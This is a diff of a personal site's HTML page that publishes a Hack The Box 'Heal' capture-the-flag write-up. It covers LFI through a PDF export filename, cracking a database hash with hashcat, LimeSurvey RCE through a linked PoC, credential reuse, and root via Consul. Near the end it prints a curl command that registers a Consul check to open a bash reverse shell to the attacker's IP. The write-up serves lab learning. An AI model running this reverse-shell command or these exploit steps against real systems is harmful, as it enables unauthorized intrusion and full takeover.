@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Heal - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Heal.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Heal machine from HackTheBox - Medium difficulty level">
+    <meta name="description" content="Detailed writeup for Heal machine from HackTheBox - Medium difficulty level">
     <meta name="keywords" content="HackTheBox, Heal, Medium, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,110 @@
         <h1 class="writeup-title">Heal</h1>
         <div class="writeup-metadata">
             <span class="difficulty medium">Medium</span>
-            <span class="date">Active machine</span>
+            <span class="date">May 17, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="Heal" src="../images/Heal/pwned.png" /></p>
-<p>Heal is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Heal retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/Heal/pwned.png" /></p>
+<p>Heal was an intricate Linux box that combined web application vulnerabilities with service exploitation. Initial reconnaissance revealed only HTTP and SSH services, with the web application featuring a resume builder.
+Investigation uncovered multiple subdomains, including an API endpoint running Rails 7.1.4 and a survey platform.</p>
+<p>The critical vulnerability began with a Local File Inclusion (LFI) in the resume PDF export functionality, allowing access to system files.
+By targeting the Rails database configuration, I extracted and cracked a password hash for user 'Ralph'.
+With these credentials, I accessed the LimeSurvey admin panel running version 6.6.4, which was vulnerable to a known RCE (CVE-2021-44967).
+Exploiting this vulnerability provided initial shell access as www-data.</p>
+<p>Privilege escalation proceeded in stages, first discovering credentials in a config file that granted access to user 'Ron'.
+Further enumeration revealed an internal Consul service running on port 8500, which was vulnerable to an RCE exploit. Leveraging this vulnerability allowed for privilege escalation to root.
+This box demonstrated the importance of subdomain enumeration, recognizing file inclusion vulnerabilities, identifying software versions for potential exploits, and thorough post-exploitation reconnaissance to discover internal services.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Heal/nmap.png" /></p>
+<p>Initial nmap scan reveals 2 ports. HTTP on 80 and SSH on 22.</p>
+<p>I will begin by visiting the newly discovered website.</p>
+<h2>Uncovering an API subdomain</h2>
+<p><img alt="site" src="../images/Heal/site.png" /></p>
+<p>There is a login/register form on the website. Before doing anything, I will switch over to burpsuite to get a clear overview of the process.</p>
+<p>I turned on intercept in burp proxy and clicked sign up.</p>
+<p><img alt="apireq" src="../images/Heal/apireq.png" /></p>
+<p>An API subdomain has been revealed. I will check it right away.</p>
+<p><img alt="ror" src="../images/Heal/ror.png" /></p>
+<p>It runs on Rails version 7.1.4. While not really useful right now, I'm sure this knowledge will come handy in the future.</p>
+<h2>LFI via resume export</h2>
+<p>After logging in as a new user, I was redirected to a resume builder page.</p>
+<p><img alt="resume" src="../images/Heal/resume.png" /></p>
+<p>Clicking on the survey button takes me to a yet another subdomain.</p>
+<p><code>http://take-survey.heal.htb/index.php/552933?lang=en</code></p>
+<p>But I'll keep my attention on this page for a little longer.</p>
+<p>At the bottom of the resume page, there is an <code>Export as PDF</code> button. After clicking it, a PDF file of the resume from the page is downloaded.</p>
+<p><img alt="p" src="../images/Heal/p.png" /></p>
+<p>Taking a look at the process through burpsuite reveals something that could be of use.</p>
+<p>While the first request looks not at all interesting, the other 2 are anything but that.</p>
+<p><img alt="burp1" src="../images/Heal/burp1.png" /></p>
+<p>The filename parameter doesn't appear to be sanitized in any way, and is easily changeable from burp. The last request is nearly identical.</p>
+<p><img alt="burp2" src="../images/Heal/burp2.png" /></p>
+<p>I will change the PDF file name to /etc/passwd within the intercepted GET request in order to confirm LFI.</p>
+<p>After doing so, the PDF viewer fails to display the downloaded file.</p>
+<p><img alt="fail" src="../images/Heal/fail.png" /></p>
+<p>But I can read it just fine from the terminal.</p>
+<p><img alt="passwd" src="../images/Heal/passwd.png" /></p>
+<h2>Leaking the database</h2>
+<p>Remembering that this is a rails app, I will try to repeat the LFI, this time targeting the default location of the rails database config file.</p>
+<p>A brief search brings me the exact file I wish to target. I'll swap the PDF filename with '../../config/database.yml', adding '../' to go up a few directories.</p>
+<p>It required a few tries, but eventually I managed to download the config file.</p>
+<p><img alt="config" src="../images/Heal/config.png" /></p>
+<p>The config file reveals 2 databases. First I'll grab the development one, repeating the LFI once again.</p>
+<p>I can open the ".pdf" file using sqlite3.</p>
+<p><img alt="database" src="../images/Heal/database.png" /></p>
+<p>There is one interesting hash in the users table. Every other account aside from Ralph is most likely user made.</p>
+<p>I'll take Ralph's hash and feed it into hashcat for some cracking.</p>
+<p><code>hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt</code></p>
+<p>After a short while, the hash cracked and Ralph's password was revealed.</p>
+<p><img alt="crack" src="../images/Heal/crack.png" /></p>
+<h2>Limesurvey RCE and shell as www-data</h2>
+<p>I tried to SSH into the box with these credentials, but it did not work. I remember that there was a survey link I haven't checked before, so I'll do that right now.</p>
+<p>I was welcomed by a 1-question survey that didn't bring anything new. However, after deleting the index and the survey ID from the searchbar, I was shown something very intriguing.</p>
+<p><img alt="lime" src="../images/Heal/lime.png" /></p>
+<p>Ralph, whose password I already have, is an administrator on this limesurvey instance. If there's an administrator, there should be an admin panel as well.</p>
+<p><img alt="admin" src="../images/Heal/admin.png" /></p>
+<p>And there is! After adding /admin to the URL, I was redirected to the admin login page. I'll try Ralph's credentials here.</p>
+<p><img alt="lon" src="../images/Heal/lon.png" /></p>
+<p>With admin access to the service, I can do a few things. However, I'll immediately note the limesurvey version that is visible in the bottom right corner.</p>
+<p><code>LimeSurvey Community Edition Version 6.6.4</code></p>
+<p>Whenever I find a version number like this, I always check for any CVE's its vulnerable for.</p>
+<p><code>https://nvd.nist.gov/vuln/detail/CVE-2021-44967</code></p>
+<p>I found a PoC rather quickly, and it seemed to be just the thing I needed.</p>
+<p><code>https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE.git</code></p>
+<p>I'll clone the repo, make some necessary changes and use the PoC as it was shown.</p>
+<p>After performing every step and setting up the shell, I get a callback.</p>
+<p><img alt="shell" src="../images/Heal/shell.png" /></p>
+<h2>Pivoting to Ron</h2>
+<p>I searched manually thought var/www/limesurvey for any kinds of config files and credentials.</p>
+<p>Eventually, I found <code>var/www/limesurvey/application/config/config.php</code>, which had something interesting inside.</p>
+<p><img alt="password" src="../images/Heal/password.png" /></p>
+<p>I'll take the password, aiming to test it against the two users who have /home directories on the box. Ron and Ralph.</p>
+<p>While it failed for Ralph, it definitely worked for Ron.</p>
+<p><img alt="whoami" src="../images/Heal/whoami.png" /></p>
+<p>With this, I can go ahead and grab the user flag.</p>
+<p><img alt="user" src="../images/Heal/user.png" /></p>
+<h1>Root flag</h1>
+<h2>Initial recon</h2>
+<p>The same credentials worked for SSH, which was the first thing I checked to get out of the reverse shell.</p>
+<p>I ran a few commands to gather some info, and found a few active ports.</p>
+<p><img alt="ss" src="../images/Heal/ss.png" /></p>
+<p>I'll reconnect my SSH session to forward a bunch of those ports back to my machine.</p>
+<h2>RCE via Consul and root shell</h2>
+<p>After scanning through most of the ports, I found one that caught my interest.</p>
+<p><img alt="consul" src="../images/Heal/consul.png" /></p>
+<p>Consul is running on port 8500. And once again, there is a version visible. So I'll do the same thing as with limesurvey.</p>
+<p><code>https://www.exploit-db.com/exploits/51117</code></p>
+<p>I found one rather quickly. This will allow me to construct a curl command for manual exploitation.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">X</span><span class="w"> </span><span class="n">PUT</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="p">&#39;{</span><span class="s">&quot;Address&quot;</span><span class="o">:</span><span class="w"> </span><span class="s">&quot;127.0.0.1&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;check&quot;</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="s">&quot;Args&quot;</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;-c&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.64/9001 0&gt;&amp;1&quot;</span><span class="p">],</span><span class="w"> </span><span class="s">&quot;interval&quot;</span><span class="o">:</span><span class="w"> </span><span class="s">&quot;10s&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Timeout&quot;</span><span class="o">:</span><span class="w"> </span><span class="s">&quot;864000s&quot;</span><span class="p">},</span><span class="w"> </span><span class="s">&quot;ID&quot;</span><span class="o">:</span><span class="w"> </span><span class="s">&quot;gato&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Name&quot;</span><span class="o">:</span><span class="w"> </span><span class="s">&quot;mal&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Port&quot;</span><span class="o">:</span><span class="w"> </span><span class="mh">9001</span><span class="p">}&#39;</span><span class="w"> </span><span class="nl">http:</span><span class="c1">//127.0.0.1:8500/v1/agent/service/register</span>
+</code></pre></div>
+
+<p>I started up a listener on port 9001, and sent the command.</p>
+<p>After a few seconds, I got a callback.</p>
+<p><img alt="root" src="../images/Heal/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
